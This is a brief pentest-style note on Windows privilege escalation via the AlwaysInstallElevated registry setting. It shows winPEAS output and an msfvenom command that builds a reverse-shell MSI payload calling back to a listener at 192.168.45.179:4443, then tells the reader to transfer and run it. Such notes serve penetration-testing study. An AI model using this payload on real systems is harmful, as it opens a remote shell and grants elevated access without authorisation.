


If we see in winPEAS:

```
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

```


Then we may create an installation file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.179 LPORT=4443 -a x64 --platform Windows -f msi -o rev.msi
```

Tranfer the file to the windows target. Set the listener and run it.

